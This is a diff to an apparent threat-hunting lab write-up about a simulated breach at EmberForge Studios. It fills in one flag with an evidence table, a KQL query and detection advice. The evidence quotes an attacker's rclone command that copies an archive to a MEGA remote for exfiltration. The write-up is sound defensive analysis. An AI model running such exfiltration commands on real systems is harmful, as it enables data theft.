@@ -123,7 +123,7 @@ A security breach was identified within EmberForge Studios, prompting a focused 
 | 2 | MITRE ATT&CK: T1567.002 – Exfiltration to Cloud Storage | T1567 – Exfiltration Over Web Service. | <Placeholder> |
 | 3 | MITRE ATT&CK: T1552.001 – Credentials in Files| T1552 – Unsecured Credentials. | <Placeholder> |
 | 4 | <Placeholder> | <Placeholder> | <Placeholder> |
-| 5 | <Placeholder> | <Placeholder> | <Placeholder> |
+| 5 | MITRE ATT&CK: T1567.002 – Exfiltration to Cloud Storage| T1567 – Exfiltration Over Web Service.| <Placeholder> |
 | 6 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 7 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 8 | <Placeholder> | <Placeholder> | <Placeholder> |
@@ -383,34 +383,38 @@ Search for command lines containing `echo` + redirection (`>>`) to config files,
 <summary id="-flag-5">🚩 <strong>Flag 5: <Technique Name></strong></summary>
 
 ### 🎯 Objective
-<What the attacker was trying to accomplish>
+Exfiltrate sensitive data from the environment by uploading archived files to an external cloud storage service.
 
 ### 📌 Finding
-<High-level description of the activity>
+The attacker repeatedly executed `rclone.exe`, a legitimate cloud synchronization tool, to transfer data externally. The command line shows attempts to copy archived data to a remote MEGA storage location, indicating multiple exfiltration attempts.
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Host | EC2AMAZ-16V3AU4.emberforge.local |
+| Timestamp | 2026-01-30 23:11:44.379 UTC |
+| Process | rclone.exe |
+| Parent Process | cmd.exe (likely) |
+| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+This confirms active data exfiltration using a trusted, legitimate tool, which makes detection more difficult. The use of `rclone` allows attackers to blend in with normal administrative activity while transferring sensitive data to external cloud storage (MEGA). Multiple execution attempts suggest persistence and determination to successfully extract data, increasing the likelihood of significant data loss.
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
+| where CommandLine_s has "rclone.conf"
+| project UtcTime_s, Computer, CommandLine_s
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="1538" height="222" alt="image" src="https://github.com/user-attachments/assets/26eeb019-b098-42d0-a974-7c33bef6d8a6" />
 
 ### 🛠️ Detection Recommendation
+Monitor for execution of cloud sync and transfer tools like `rclone.exe`, especially from non-standard directories such as `C:\Users\Public`. Alert on command-line arguments referencing external destinations (e.g., `mega:`, `drive:`) and correlate with file access to sensitive directories and outbound network traffic to cloud storage services.
 
 **Hunting Tip:**  
-<Actionable guidance for defenders>
+Search for repeated executions of the same tool within short timeframes, especially with similar command-line patterns. Pivot on `rclone.exe` activity and analyze associated file paths and remote destinations to quickly identify exfiltration behavior.
 
 </details>
 
